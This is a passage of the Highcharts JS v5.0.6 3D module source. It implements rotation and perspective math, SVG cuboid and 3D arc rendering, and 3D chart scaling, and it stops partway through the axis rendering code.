/**
 * @license Highcharts JS v5.0.6 (2016-12-07)
 *
 * 3D features for Highcharts JS
 *
 * @license: www.highcharts.com/license
 */
(function(factory) {
    if (typeof module === 'object' && module.exports) {
        module.exports = factory;
    } else {
        factory(Highcharts);
    }
}(function(Highcharts) {
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';
        /**
         *	Mathematical Functionility
         */
        var deg2rad = H.deg2rad,
            pick = H.pick;
        /**
         * Apply 3-D rotation
         * Euler Angles (XYZ): cosA = cos(Alfa|Roll), cosB = cos(Beta|Pitch), cosG = cos(Gamma|Yaw) 
         * 
         * Composite rotation:
         * |          cosB * cosG             |           cosB * sinG            |    -sinB    |
         * | sinA * sinB * cosG - cosA * sinG | sinA * sinB * sinG + cosA * cosG | sinA * cosB |
         * | cosA * sinB * cosG + sinA * sinG | cosA * sinB * sinG - sinA * cosG | cosA * cosB |
         * 
         * Now, Gamma/Yaw is not used (angle=0), so we assume cosG = 1 and sinG = 0, so we get:
         * |     cosB    |   0    |   - sinB    |
         * | sinA * sinB |  cosA  | sinA * cosB |
         * | cosA * sinB | - sinA | cosA * cosB |
         * 
         * But in browsers, y is reversed, so we get sinA => -sinA. The general result is:
         * |      cosB     |   0    |    - sinB     |     | x |     | px |
         * | - sinA * sinB |  cosA  | - sinA * cosB |  x  | y |  =  | py | 
         * |  cosA * sinB  |  sinA  |  cosA * cosB  |     | z |     | pz |
         */
        function rotate3D(x, y, z, angles) {
            return {
                x: angles.cosB * x - angles.sinB * z,
                y: -angles.sinA * angles.sinB * x + angles.cosA * y - angles.cosB * angles.sinA * z,
                z: angles.cosA * angles.sinB * x + angles.sinA * y + angles.cosA * angles.cosB * z
            };
        }

        function perspective3D(coordinate, origin, distance) {
            var projection = ((distance > 0) && (distance < Number.POSITIVE_INFINITY)) ? distance / (coordinate.z + origin.z + distance) : 1;
            return {
                x: coordinate.x * projection,
                y: coordinate.y * projection
            };
        }

        /**
         * Transforms a given array of points according to the angles in chart.options.
         * Parameters:
         *		- points: the array of points
         *		- chart: the chart
         *		- insidePlotArea: wether to verifiy the points are inside the plotArea
         * Returns:
         *		- an array of transformed points
         */
        H.perspective = function(points, chart, insidePlotArea) {
            var options3d = chart.options.chart.options3d,
                inverted = insidePlotArea ? chart.inverted : false,
                origin = {
                    x: chart.plotWidth / 2,
                    y: chart.plotHeight / 2,
                    z: options3d.depth / 2,
                    vd: pick(options3d.depth, 1) * pick(options3d.viewDistance, 0)
                },
                scale = chart.scale3d || 1,
                beta = deg2rad * options3d.beta * (inverted ? -1 : 1),
                alpha = deg2rad * options3d.alpha * (inverted ? -1 : 1),
                angles = {
                    cosA: Math.cos(alpha),
                    cosB: Math.cos(-beta),
                    sinA: Math.sin(alpha),
                    sinB: Math.sin(-beta)
                };

            if (!insidePlotArea) {
                origin.x += chart.plotLeft;
                origin.y += chart.plotTop;
            }

            // Transform each point
            return H.map(points, function(point) {
                var rotated = rotate3D(
                        (inverted ? point.y : point.x) - origin.x,
                        (inverted ? point.x : point.y) - origin.y,
                        (point.z || 0) - origin.z,
                        angles
                    ),
                    coordinate = perspective3D(rotated, origin, origin.vd); // Apply perspective

                // Apply translation
                coordinate.x = coordinate.x * scale + origin.x;
                coordinate.y = coordinate.y * scale + origin.y;
                coordinate.z = rotated.z * scale + origin.z;

                return {
                    x: (inverted ? coordinate.y : coordinate.x),
                    y: (inverted ? coordinate.x : coordinate.y),
                    z: coordinate.z
                };
            });
        };

        /**
         * Calculate a distance from camera to points - made for calculating zIndex of scatter points.
         * Parameters:
         *		- coordinates: The coordinates of the specific point
         *		- chart: the chart
         * Returns:
         *		- a distance from camera to point
         */
        H.pointCameraDistance = function(coordinates, chart) {
            var options3d = chart.options.chart.options3d,
                cameraPosition = {
                    x: chart.plotWidth / 2,
                    y: chart.plotHeight / 2,
                    z: pick(options3d.depth, 1) * pick(options3d.viewDistance, 0) + options3d.depth
                },
                distance = Math.sqrt(Math.pow(cameraPosition.x - coordinates.plotX, 2) + Math.pow(cameraPosition.y - coordinates.plotY, 2) + Math.pow(cameraPosition.z - coordinates.plotZ, 2));
            return distance;
        };

    }(Highcharts));
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';
        var cos = Math.cos,
            PI = Math.PI,
            sin = Math.sin;


        var animObject = H.animObject,
            charts = H.charts,
            color = H.color,
            defined = H.defined,
            deg2rad = H.deg2rad,
            each = H.each,
            extend = H.extend,
            inArray = H.inArray,
            map = H.map,
            merge = H.merge,
            perspective = H.perspective,
            pick = H.pick,
            SVGElement = H.SVGElement,
            SVGRenderer = H.SVGRenderer,
            wrap = H.wrap;
        /*** 
        	EXTENSION TO THE SVG-RENDERER TO ENABLE 3D SHAPES
        	***/
        ////// HELPER METHODS //////

        var dFactor = (4 * (Math.sqrt(2) - 1) / 3) / (PI / 2);


        //Shoelace algorithm -- http://en.wikipedia.org/wiki/Shoelace_formula
        function shapeArea(vertexes) {
            var area = 0,
                i,
                j;
            for (i = 0; i < vertexes.length; i++) {
                j = (i + 1) % vertexes.length;
                area += vertexes[i].x * vertexes[j].y - vertexes[j].x * vertexes[i].y;
            }
            return area / 2;
        }

        function averageZ(vertexes) {
            var z = 0,
                i;
            for (i = 0; i < vertexes.length; i++) {
                z += vertexes[i].z;
            }
            return vertexes.length ? z / vertexes.length : 0;
        }

        /** Method to construct a curved path
         * Can 'wrap' around more then 180 degrees
         */
        function curveTo(cx, cy, rx, ry, start, end, dx, dy) {
            var result = [],
                arcAngle = end - start;
            if ((end > start) && (end - start > Math.PI / 2 + 0.0001)) {
                result = result.concat(curveTo(cx, cy, rx, ry, start, start + (Math.PI / 2), dx, dy));
                result = result.concat(curveTo(cx, cy, rx, ry, start + (Math.PI / 2), end, dx, dy));
                return result;
            }
            if ((end < start) && (start - end > Math.PI / 2 + 0.0001)) {
                result = result.concat(curveTo(cx, cy, rx, ry, start, start - (Math.PI / 2), dx, dy));
                result = result.concat(curveTo(cx, cy, rx, ry, start - (Math.PI / 2), end, dx, dy));
                return result;
            }
            return [
                'C',
                cx + (rx * Math.cos(start)) - ((rx * dFactor * arcAngle) * Math.sin(start)) + dx,
                cy + (ry * Math.sin(start)) + ((ry * dFactor * arcAngle) * Math.cos(start)) + dy,
                cx + (rx * Math.cos(end)) + ((rx * dFactor * arcAngle) * Math.sin(end)) + dx,
                cy + (ry * Math.sin(end)) - ((ry * dFactor * arcAngle) * Math.cos(end)) + dy,

                cx + (rx * Math.cos(end)) + dx,
                cy + (ry * Math.sin(end)) + dy
            ];
        }


        /**
         * Override the SVGRenderer initiator to add definitions used by brighter and
         * darker faces of the cuboids.
         */
        wrap(SVGRenderer.prototype, 'init', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            each([{
                name: 'darker',
                slope: 0.6
            }, {
                name: 'brighter',
                slope: 1.4
            }], function(cfg) {
                this.definition({
                    tagName: 'filter',
                    id: 'highcharts-' + cfg.name,
                    children: [{
                        tagName: 'feComponentTransfer',
                        children: [{
                            tagName: 'feFuncR',
                            type: 'linear',
                            slope: cfg.slope
                        }, {
                            tagName: 'feFuncG',
                            type: 'linear',
                            slope: cfg.slope
                        }, {
                            tagName: 'feFuncB',
                            type: 'linear',
                            slope: cfg.slope
                        }]
                    }]
                });
            }, this);
        });


        SVGRenderer.prototype.toLinePath = function(points, closed) {
            var result = [];

            // Put "L x y" for each point
            each(points, function(point) {
                result.push('L', point.x, point.y);
            });

            if (points.length) {
                // Set the first element to M
                result[0] = 'M';

                // If it is a closed line, add Z
                if (closed) {
                    result.push('Z');
                }
            }

            return result;
        };

        ////// CUBOIDS //////
        SVGRenderer.prototype.cuboid = function(shapeArgs) {

            var result = this.g(),
                paths = this.cuboidPath(shapeArgs);



            // create the 3 sides
            result.front = this.path(paths[0]).attr({
                'class': 'highcharts-3d-front',
                zIndex: paths[3]
            }).add(result);
            result.top = this.path(paths[1]).attr({
                'class': 'highcharts-3d-top',
                zIndex: paths[4]
            }).add(result);
            result.side = this.path(paths[2]).attr({
                'class': 'highcharts-3d-side',
                zIndex: paths[5]
            }).add(result);

            // apply the fill everywhere, the top a bit brighter, the side a bit darker
            result.fillSetter = function(fill) {
                this.front.attr({
                    fill: fill
                });
                this.top.attr({
                    fill: color(fill).brighten(0.1).get()
                });
                this.side.attr({
                    fill: color(fill).brighten(-0.1).get()
                });

                this.color = fill;
                return this;
            };

            // apply opacaity everywhere
            result.opacitySetter = function(opacity) {
                this.front.attr({
                    opacity: opacity
                });
                this.top.attr({
                    opacity: opacity
                });
                this.side.attr({
                    opacity: opacity
                });
                return this;
            };

            result.attr = function(args) {
                if (args.shapeArgs || defined(args.x)) {
                    var shapeArgs = args.shapeArgs || args;
                    var paths = this.renderer.cuboidPath(shapeArgs);
                    this.front.attr({
                        d: paths[0],
                        zIndex: paths[3]
                    });
                    this.top.attr({
                        d: paths[1],
                        zIndex: paths[4]
                    });
                    this.side.attr({
                        d: paths[2],
                        zIndex: paths[5]
                    });
                } else {
                    return H.SVGElement.prototype.attr.call(this, args); // getter returns value
                }

                return this;
            };

            result.animate = function(args, duration, complete) {
                if (defined(args.x) && defined(args.y)) {
                    var paths = this.renderer.cuboidPath(args);
                    this.front.attr({
                        zIndex: paths[3]
                    }).animate({
                        d: paths[0]
                    }, duration, complete);
                    this.top.attr({
                        zIndex: paths[4]
                    }).animate({
                        d: paths[1]
                    }, duration, complete);
                    this.side.attr({
                        zIndex: paths[5]
                    }).animate({
                        d: paths[2]
                    }, duration, complete);
                    this.attr({
                        zIndex: -paths[6] // #4774
                    });
                } else if (args.opacity) {
                    this.front.animate(args, duration, complete);
                    this.top.animate(args, duration, complete);
                    this.side.animate(args, duration, complete);
                } else {
                    SVGElement.prototype.animate.call(this, args, duration, complete);
                }
                return this;
            };

            // destroy all children
            result.destroy = function() {
                this.front.destroy();
                this.top.destroy();
                this.side.destroy();

                return null;
            };

            // Apply the Z index to the cuboid group
            result.attr({
                zIndex: -paths[6]
            });

            return result;
        };

        /**
         *	Generates a cuboid
         */
        SVGRenderer.prototype.cuboidPath = function(shapeArgs) {
            var x = shapeArgs.x,
                y = shapeArgs.y,
                z = shapeArgs.z,
                h = shapeArgs.height,
                w = shapeArgs.width,
                d = shapeArgs.depth,
                chart = charts[this.chartIndex];

            // The 8 corners of the cube
            var pArr = [{
                x: x,
                y: y,
                z: z
            }, {
                x: x + w,
                y: y,
                z: z
            }, {
                x: x + w,
                y: y + h,
                z: z
            }, {
                x: x,
                y: y + h,
                z: z
            }, {
                x: x,
                y: y + h,
                z: z + d
            }, {
                x: x + w,
                y: y + h,
                z: z + d
            }, {
                x: x + w,
                y: y,
                z: z + d
            }, {
                x: x,
                y: y,
                z: z + d
            }];

            // apply perspective
            pArr = perspective(pArr, chart, shapeArgs.insidePlotArea);

            // helper method to decide which side is visible
            function mapPath(i) {
                return pArr[i];
            }
            var pickShape = function(path1, path2) {
                var ret = [];
                path1 = map(path1, mapPath);
                path2 = map(path2, mapPath);
                if (shapeArea(path1) < 0) {
                    ret = path1;
                } else if (shapeArea(path2) < 0) {
                    ret = path2;
                }
                return ret;
            };

            // front or back
            var front = [3, 2, 1, 0];
            var back = [7, 6, 5, 4];
            var path1 = pickShape(front, back);

            // top or bottom
            var top = [1, 6, 7, 0];
            var bottom = [4, 5, 2, 3];
            var path2 = pickShape(top, bottom);

            // side
            var right = [1, 2, 5, 6];
            var left = [0, 7, 4, 3];
            var path3 = pickShape(right, left);

            return [this.toLinePath(path1, true), this.toLinePath(path2, true), this.toLinePath(path3, true), averageZ(path1), averageZ(path2), averageZ(path3), averageZ(map(bottom, mapPath)) * 9e9]; // #4774
        };

        ////// SECTORS //////
        H.SVGRenderer.prototype.arc3d = function(attribs) {

            var wrapper = this.g(),
                renderer = wrapper.renderer,
                customAttribs = ['x', 'y', 'r', 'innerR', 'start', 'end'];

            /**
             * Get custom attributes. Mutate the original object and return an object with only custom attr.
             */
            function suckOutCustom(params) {
                var hasCA = false,
                    ca = {};
                for (var key in params) {
                    if (inArray(key, customAttribs) !== -1) {
                        ca[key] = params[key];
                        delete params[key];
                        hasCA = true;
                    }
                }
                return hasCA ? ca : false;
            }

            attribs = merge(attribs);

            attribs.alpha *= deg2rad;
            attribs.beta *= deg2rad;

            // Create the different sub sections of the shape
            wrapper.top = renderer.path();
            wrapper.side1 = renderer.path();
            wrapper.side2 = renderer.path();
            wrapper.inn = renderer.path();
            wrapper.out = renderer.path();

            /**
             * Add all faces
             */
            wrapper.onAdd = function() {
                var parent = wrapper.parentGroup,
                    className = wrapper.attr('class');
                wrapper.top.add(wrapper);

                // These faces are added outside the wrapper group because the z index
                // relates to neighbour elements as well
                each(['out', 'inn', 'side1', 'side2'], function(face) {
                    wrapper[face]
                        .addClass(className + ' highcharts-3d-side')
                        .add(parent);
                });
            };

            /**
             * Compute the transformed paths and set them to the composite shapes
             */
            wrapper.setPaths = function(attribs) {

                var paths = wrapper.renderer.arc3dPath(attribs),
                    zIndex = paths.zTop * 100;

                wrapper.attribs = attribs;

                wrapper.top.attr({
                    d: paths.top,
                    zIndex: paths.zTop
                });
                wrapper.inn.attr({
                    d: paths.inn,
                    zIndex: paths.zInn
                });
                wrapper.out.attr({
                    d: paths.out,
                    zIndex: paths.zOut
                });
                wrapper.side1.attr({
                    d: paths.side1,
                    zIndex: paths.zSide1
                });
                wrapper.side2.attr({
                    d: paths.side2,
                    zIndex: paths.zSide2
                });


                // show all children
                wrapper.zIndex = zIndex;
                wrapper.attr({
                    zIndex: zIndex
                });

                // Set the radial gradient center the first time
                if (attribs.center) {
                    wrapper.top.setRadialReference(attribs.center);
                    delete attribs.center;
                }
            };
            wrapper.setPaths(attribs);

            // Apply the fill to the top and a darker shade to the sides
            wrapper.fillSetter = function(value) {
                var darker = color(value).brighten(-0.1).get();

                this.fill = value;

                this.side1.attr({
                    fill: darker
                });
                this.side2.attr({
                    fill: darker
                });
                this.inn.attr({
                    fill: darker
                });
                this.out.attr({
                    fill: darker
                });
                this.top.attr({
                    fill: value
                });
                return this;
            };

            // Apply the same value to all. These properties cascade down to the children
            // when set to the composite arc3d.
            each(['opacity', 'translateX', 'translateY', 'visibility'], function(setter) {
                wrapper[setter + 'Setter'] = function(value, key) {
                    wrapper[key] = value;
                    each(['out', 'inn', 'side1', 'side2', 'top'], function(el) {
                        wrapper[el].attr(key, value);
                    });
                };
            });

            /**
             * Override attr to remove shape attributes and use those to set child paths
             */
            wrap(wrapper, 'attr', function(proceed, params) {
                var ca;
                if (typeof params === 'object') {
                    ca = suckOutCustom(params);
                    if (ca) {
                        extend(wrapper.attribs, ca);
                        wrapper.setPaths(wrapper.attribs);
                    }
                }
                return proceed.apply(this, [].slice.call(arguments, 1));
            });

            /**
             * Override the animate function by sucking out custom parameters related to the shapes directly,
             * and update the shapes from the animation step.
             */
            wrap(wrapper, 'animate', function(proceed, params, animation, complete) {
                var ca,
                    from = this.attribs,
                    to,
                    anim;

                // Attribute-line properties connected to 3D. These shouldn't have been in the 
                // attribs collection in the first place.
                delete params.center;
                delete params.z;
                delete params.depth;
                delete params.alpha;
                delete params.beta;

                anim = animObject(pick(animation, this.renderer.globalAnimation));

                if (anim.duration) {
                    params = merge(params); // Don't mutate the original object
                    ca = suckOutCustom(params);
                    params.dummy = 1; // Params need to have a property in order for the step to run (#5765)

                    if (ca) {
                        to = ca;
                        anim.step = function(a, fx) {
                            function interpolate(key) {
                                return from[key] + (pick(to[key], from[key]) - from[key]) * fx.pos;
                            }

                            if (fx.prop === 'dummy') {
                                fx.elem.setPaths(merge(from, {
                                    x: interpolate('x'),
                                    y: interpolate('y'),
                                    r: interpolate('r'),
                                    innerR: interpolate('innerR'),
                                    start: interpolate('start'),
                                    end: interpolate('end')
                                }));
                            }
                        };
                    }
                    animation = anim; // Only when duration (#5572)
                }
                return proceed.call(this, params, animation, complete);
            });

            // destroy all children
            wrapper.destroy = function() {
                this.top.destroy();
                this.out.destroy();
                this.inn.destroy();
                this.side1.destroy();
                this.side2.destroy();

                SVGElement.prototype.destroy.call(this);
            };
            // hide all children
            wrapper.hide = function() {
                this.top.hide();
                this.out.hide();
                this.inn.hide();
                this.side1.hide();
                this.side2.hide();
            };
            wrapper.show = function() {
                this.top.show();
                this.out.show();
                this.inn.show();
                this.side1.show();
                this.side2.show();
            };
            return wrapper;
        };

        /**
         * Generate the paths required to draw a 3D arc
         */
        SVGRenderer.prototype.arc3dPath = function(shapeArgs) {
            var cx = shapeArgs.x, // x coordinate of the center
                cy = shapeArgs.y, // y coordinate of the center
                start = shapeArgs.start, // start angle
                end = shapeArgs.end - 0.00001, // end angle
                r = shapeArgs.r, // radius
                ir = shapeArgs.innerR, // inner radius
                d = shapeArgs.depth, // depth
                alpha = shapeArgs.alpha, // alpha rotation of the chart
                beta = shapeArgs.beta; // beta rotation of the chart

            // Derived Variables
            var cs = Math.cos(start), // cosinus of the start angle
                ss = Math.sin(start), // sinus of the start angle
                ce = Math.cos(end), // cosinus of the end angle
                se = Math.sin(end), // sinus of the end angle
                rx = r * Math.cos(beta), // x-radius 
                ry = r * Math.cos(alpha), // y-radius
                irx = ir * Math.cos(beta), // x-radius (inner)
                iry = ir * Math.cos(alpha), // y-radius (inner)
                dx = d * Math.sin(beta), // distance between top and bottom in x
                dy = d * Math.sin(alpha); // distance between top and bottom in y

            // TOP
            var top = ['M', cx + (rx * cs), cy + (ry * ss)];
            top = top.concat(curveTo(cx, cy, rx, ry, start, end, 0, 0));
            top = top.concat([
                'L', cx + (irx * ce), cy + (iry * se)
            ]);
            top = top.concat(curveTo(cx, cy, irx, iry, end, start, 0, 0));
            top = top.concat(['Z']);
            // OUTSIDE
            var b = (beta > 0 ? Math.PI / 2 : 0),
                a = (alpha > 0 ? 0 : Math.PI / 2);

            var start2 = start > -b ? start : (end > -b ? -b : start),
                end2 = end < PI - a ? end : (start < PI - a ? PI - a : end),
                midEnd = 2 * PI - a;

            // When slice goes over bottom middle, need to add both, left and right outer side.
            // Additionally, when we cross right hand edge, create sharp edge. Outer shape/wall:
            //
            //            -------
            //          /    ^    \
            //    4)   /   /   \   \  1)
            //        /   /     \   \
            //       /   /       \   \
            // (c)=> ====         ==== <=(d) 
            //       \   \       /   /
            //        \   \<=(a)/   /
            //         \   \   /   / <=(b)
            //    3)    \    v    /  2)
            //            -------
            //
            // (a) - inner side
            // (b) - outer side
            // (c) - left edge (sharp)
            // (d) - right edge (sharp)
            // 1..n - rendering order for startAngle = 0, when set to e.g 90, order changes clockwise (1->2, 2->3, n->1) and counterclockwise for negative startAngle

            var out = ['M', cx + (rx * cos(start2)), cy + (ry * sin(start2))];
            out = out.concat(curveTo(cx, cy, rx, ry, start2, end2, 0, 0));

            if (end > midEnd && start < midEnd) { // When shape is wide, it can cross both, (c) and (d) edges, when using startAngle
                // Go to outer side
                out = out.concat([
                    'L', cx + (rx * cos(end2)) + dx, cy + (ry * sin(end2)) + dy
                ]);
                // Curve to the right edge of the slice (d)
                out = out.concat(curveTo(cx, cy, rx, ry, end2, midEnd, dx, dy));
                // Go to the inner side
                out = out.concat([
                    'L', cx + (rx * cos(midEnd)), cy + (ry * sin(midEnd))
                ]);
                // Curve to the true end of the slice
                out = out.concat(curveTo(cx, cy, rx, ry, midEnd, end, 0, 0));
                // Go to the outer side
                out = out.concat([
                    'L', cx + (rx * cos(end)) + dx, cy + (ry * sin(end)) + dy
                ]);
                // Go back to middle (d)
                out = out.concat(curveTo(cx, cy, rx, ry, end, midEnd, dx, dy));
                out = out.concat([
                    'L', cx + (rx * cos(midEnd)), cy + (ry * sin(midEnd))
                ]);
                // Go back to the left edge
                out = out.concat(curveTo(cx, cy, rx, ry, midEnd, end2, 0, 0));
            } else if (end > PI - a && start < PI - a) { // But shape can cross also only (c) edge:
                // Go to outer side
                out = out.concat([
                    'L', cx + (rx * Math.cos(end2)) + dx, cy + (ry * Math.sin(end2)) + dy
                ]);
                // Curve to the true end of the slice
                out = out.concat(curveTo(cx, cy, rx, ry, end2, end, dx, dy));
                // Go to the inner side
                out = out.concat([
                    'L', cx + (rx * Math.cos(end)), cy + (ry * Math.sin(end))
                ]);
                // Go back to the artifical end2
                out = out.concat(curveTo(cx, cy, rx, ry, end, end2, 0, 0));
            }

            out = out.concat([
                'L', cx + (rx * Math.cos(end2)) + dx, cy + (ry * Math.sin(end2)) + dy
            ]);
            out = out.concat(curveTo(cx, cy, rx, ry, end2, start2, dx, dy));
            out = out.concat(['Z']);

            // INSIDE
            var inn = ['M', cx + (irx * cs), cy + (iry * ss)];
            inn = inn.concat(curveTo(cx, cy, irx, iry, start, end, 0, 0));
            inn = inn.concat([
                'L', cx + (irx * Math.cos(end)) + dx, cy + (iry * Math.sin(end)) + dy
            ]);
            inn = inn.concat(curveTo(cx, cy, irx, iry, end, start, dx, dy));
            inn = inn.concat(['Z']);

            // SIDES
            var side1 = [
                'M', cx + (rx * cs), cy + (ry * ss),
                'L', cx + (rx * cs) + dx, cy + (ry * ss) + dy,
                'L', cx + (irx * cs) + dx, cy + (iry * ss) + dy,
                'L', cx + (irx * cs), cy + (iry * ss),
                'Z'
            ];
            var side2 = [
                'M', cx + (rx * ce), cy + (ry * se),
                'L', cx + (rx * ce) + dx, cy + (ry * se) + dy,
                'L', cx + (irx * ce) + dx, cy + (iry * se) + dy,
                'L', cx + (irx * ce), cy + (iry * se),
                'Z'
            ];

            // correction for changed position of vanishing point caused by alpha and beta rotations
            var angleCorr = Math.atan2(dy, -dx),
                angleEnd = Math.abs(end + angleCorr),
                angleStart = Math.abs(start + angleCorr),
                angleMid = Math.abs((start + end) / 2 + angleCorr);

            // set to 0-PI range
            function toZeroPIRange(angle) {
                angle = angle % (2 * Math.PI);
                if (angle > Math.PI) {
                    angle = 2 * Math.PI - angle;
                }
                return angle;
            }
            angleEnd = toZeroPIRange(angleEnd);
            angleStart = toZeroPIRange(angleStart);
            angleMid = toZeroPIRange(angleMid);

            // *1e5 is to compensate pInt in zIndexSetter
            var incPrecision = 1e5,
                a1 = angleMid * incPrecision,
                a2 = angleStart * incPrecision,
                a3 = angleEnd * incPrecision;

            return {
                top: top,
                zTop: Math.PI * incPrecision + 1, // max angle is PI, so this is allways higher
                out: out,
                zOut: Math.max(a1, a2, a3),
                inn: inn,
                zInn: Math.max(a1, a2, a3),
                side1: side1,
                zSide1: a3 * 0.99, // to keep below zOut and zInn in case of same values
                side2: side2,
                zSide2: a2 * 0.99
            };
        };

    }(Highcharts));
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';
        var Chart = H.Chart,
            each = H.each,
            merge = H.merge,
            perspective = H.perspective,
            pick = H.pick,
            wrap = H.wrap;

        /*** 
        	EXTENSION FOR 3D CHARTS
        ***/
        // Shorthand to check the is3d flag
        Chart.prototype.is3d = function() {
            return this.options.chart.options3d && this.options.chart.options3d.enabled; // #4280
        };

        Chart.prototype.propsRequireDirtyBox.push('chart.options3d');
        Chart.prototype.propsRequireUpdateSeries.push('chart.options3d');

        /**
         * Calculate scale of the 3D view. That is required to
         * fit chart's 3D projection into the actual plotting area. Reported as #4933.
         * @notice This function should ideally take the plot values instead of a chart object, 
         *         but since the chart object is needed for perspective it is not practical. 
         *         Possible to make both getScale and perspective more logical and also immutable.
         * @param  {Object} chart Chart object
         * @param  {Number} chart.plotLeft
         * @param  {Number} chart.plotWidth
         * @param  {Number} chart.plotTop
         * @param  {Number} chart.plotHeight
         * @param  {Number} depth The depth of the chart
         * @return {Number} The scale to fit the 3D chart into the plotting area.
         */
        function getScale(chart, depth) {
            var plotLeft = chart.plotLeft,
                plotRight = chart.plotWidth + plotLeft,
                plotTop = chart.plotTop,
                plotBottom = chart.plotHeight + plotTop,
                originX = plotLeft + chart.plotWidth / 2,
                originY = plotTop + chart.plotHeight / 2,
                bbox3d = {
                    minX: Number.MAX_VALUE,
                    maxX: -Number.MAX_VALUE,
                    minY: Number.MAX_VALUE,
                    maxY: -Number.MAX_VALUE
                },
                corners,
                scale = 1;

            // Top left corners:
            corners = [{
                x: plotLeft,
                y: plotTop,
                z: 0
            }, {
                x: plotLeft,
                y: plotTop,
                z: depth
            }];

            // Top right corners:
            each([0, 1], function(i) {
                corners.push({
                    x: plotRight,
                    y: corners[i].y,
                    z: corners[i].z
                });
            });

            // All bottom corners:
            each([0, 1, 2, 3], function(i) {
                corners.push({
                    x: corners[i].x,
                    y: plotBottom,
                    z: corners[i].z
                });
            });

            // Calculate 3D corners:
            corners = perspective(corners, chart, false);

            // Get bounding box of 3D element:
            each(corners, function(corner) {
                bbox3d.minX = Math.min(bbox3d.minX, corner.x);
                bbox3d.maxX = Math.max(bbox3d.maxX, corner.x);
                bbox3d.minY = Math.min(bbox3d.minY, corner.y);
                bbox3d.maxY = Math.max(bbox3d.maxY, corner.y);
            });

            // Left edge:
            if (plotLeft > bbox3d.minX) {
                scale = Math.min(scale, 1 - Math.abs((plotLeft + originX) / (bbox3d.minX + originX)) % 1);
            }

            // Right edge:
            if (plotRight < bbox3d.maxX) {
                scale = Math.min(scale, (plotRight - originX) / (bbox3d.maxX - originX));
            }

            // Top edge:
            if (plotTop > bbox3d.minY) {
                if (bbox3d.minY < 0) {
                    scale = Math.min(scale, (plotTop + originY) / (-bbox3d.minY + plotTop + originY));
                } else {
                    scale = Math.min(scale, 1 - (plotTop + originY) / (bbox3d.minY + originY) % 1);
                }
            }

            // Bottom edge:
            if (plotBottom < bbox3d.maxY) {
                scale = Math.min(scale, Math.abs((plotBottom - originY) / (bbox3d.maxY - originY)));
            }

            return scale;
        }



        H.wrap(H.Chart.prototype, 'isInsidePlot', function(proceed) {
            return this.is3d() || proceed.apply(this, [].slice.call(arguments, 1));
        });

        var defaultOptions = H.getOptions();
        merge(true, defaultOptions, {
            chart: {
                options3d: {
                    enabled: false,
                    alpha: 0,
                    beta: 0,
                    depth: 100,
                    fitToPlot: true,
                    viewDistance: 25,
                    frame: {
                        bottom: {
                            size: 1
                        },
                        side: {
                            size: 1
                        },
                        back: {
                            size: 1
                        }
                    }
                }
            }
        });


        /**
         * Override the getContainer by adding the required CSS classes for column 
         * sides (#6018)
         */
        wrap(Chart.prototype, 'getContainer', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            this.renderer.definition({
                tagName: 'style',
                textContent: '.highcharts-3d-top{' +
                    'filter: url(#highcharts-brighter)' +
                    '}\n' +
                    '.highcharts-3d-side{' +
                    'filter: url(#highcharts-darker)' +
                    '}\n'
            });
        });


        wrap(Chart.prototype, 'setClassName', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            if (this.is3d()) {
                this.container.className += ' highcharts-3d-chart';
            }
        });

        H.wrap(H.Chart.prototype, 'setChartSize', function(proceed) {
            var chart = this,
                options3d = chart.options.chart.options3d;

            proceed.apply(chart, [].slice.call(arguments, 1));

            if (chart.is3d()) {
                var inverted = chart.inverted,
                    clipBox = chart.clipBox,
                    margin = chart.margin,
                    x = inverted ? 'y' : 'x',
                    y = inverted ? 'x' : 'y',
                    w = inverted ? 'height' : 'width',
                    h = inverted ? 'width' : 'height';

                clipBox[x] = -(margin[3] || 0);
                clipBox[y] = -(margin[0] || 0);
                clipBox[w] = chart.chartWidth + (margin[3] || 0) + (margin[1] || 0);
                clipBox[h] = chart.chartHeight + (margin[0] || 0) + (margin[2] || 0);

                // Set scale, used later in perspective method():
                chart.scale3d = 1; // @notice getScale uses perspective, so scale3d has to be reset.
                if (options3d.fitToPlot === true) {
                    chart.scale3d = getScale(chart, options3d.depth);
                }
            }
        });

        wrap(Chart.prototype, 'redraw', function(proceed) {
            if (this.is3d()) {
                // Set to force a redraw of all elements
                this.isDirtyBox = true;
            }
            proceed.apply(this, [].slice.call(arguments, 1));
        });

        // Draw the series in the reverse order (#3803, #3917)
        wrap(Chart.prototype, 'renderSeries', function(proceed) {
            var series,
                i = this.series.length;

            if (this.is3d()) {
                while (i--) {
                    series = this.series[i];
                    series.translate();
                    series.render();
                }
            } else {
                proceed.call(this);
            }
        });

        Chart.prototype.retrieveStacks = function(stacking) {
            var series = this.series,
                stacks = {},
                stackNumber,
                i = 1;

            each(this.series, function(s) {
                stackNumber = pick(s.options.stack, (stacking ? 0 : series.length - 1 - s.index)); // #3841, #4532
                if (!stacks[stackNumber]) {
                    stacks[stackNumber] = {
                        series: [s],
                        position: i
                    };
                    i++;
                } else {
                    stacks[stackNumber].series.push(s);
                }
            });

            stacks.totalStacks = i + 1;
            return stacks;
        };

    }(Highcharts));
    (function(H) {
        /**
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        'use strict';
        var ZAxis,

            Axis = H.Axis,
            Chart = H.Chart,
            each = H.each,
            extend = H.extend,
            merge = H.merge,
            perspective = H.perspective,
            pick = H.pick,
            splat = H.splat,
            Tick = H.Tick,
            wrap = H.wrap;
        /***
        	EXTENSION TO THE AXIS
        ***/
        wrap(Axis.prototype, 'setOptions', function(proceed, userOptions) {
            var options;
            proceed.call(this, userOptions);
            if (this.chart.is3d()) {
                options = this.options;
                options.tickWidth = pick(options.tickWidth, 0);
                options.gridLineWidth = pick(options.gridLineWidth, 1);
            }
        });

        wrap(Axis.prototype, 'render', function(proceed) {
            proceed.apply(this, [].slice.call(arguments, 1));

            // Do not do this if the chart is not 3D
            if (!this.chart.is3d()) {
                return;
            }

            var chart = this.chart,
                renderer = chart.renderer,
                options3d = chart.options.chart.options3d,
                frame = options3d.frame,
                fbottom = frame.bottom,
                fback = frame.back,
                fside = frame.side,
                depth = options3d.depth,
                height = this.height,
                width = this.width,
                left = this.left,
